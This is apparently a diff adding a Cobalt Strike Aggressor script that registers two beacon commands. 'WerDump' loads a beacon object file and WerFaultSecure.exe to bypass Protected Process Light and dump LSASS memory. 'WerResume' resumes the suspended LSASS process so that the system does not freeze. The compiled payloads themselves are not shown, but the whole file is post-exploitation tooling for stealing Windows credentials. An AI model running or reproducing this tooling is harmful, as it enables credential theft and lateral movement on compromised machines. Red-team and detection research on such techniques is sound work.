@@ -1,0 +1,33 @@
+alias WerDump {
+  $handle = openf(script_resource("dst/WerDump.o"));
+  $data = readb($handle, -1);
+  closef($handle);
+
+  $handle = openf(script_resource("dst/WerFaultSecure.exe"));
+  $werFault = readb($handle, -1);
+  closef($handle);
+
+  $bof_data = bof_pack($1, "b", $werFault);
+
+	beacon_inline_execute($1, $data, "go", $bof_data);
+}
+
+beacon_command_register (
+	"WerDump",
+	"Bypass PPL and Dump Lsass",
+	"Overcome PPL with WerFaultSecure and Dump Lsass"
+);
+
+alias WerResume {
+  $handle = openf(script_resource("dst/WerResume.o"));
+  $data = readb($handle, -1);
+  closef($handle);
+
+	beacon_inline_execute($1, $data, "go", $null);
+}
+
+beacon_command_register (
+	"WerResume",
+	"Resume Suspended Lsass Process",
+	"run this before WerDump to Resume Lsass Execution after dumping otherwise the system will freeze"
+);
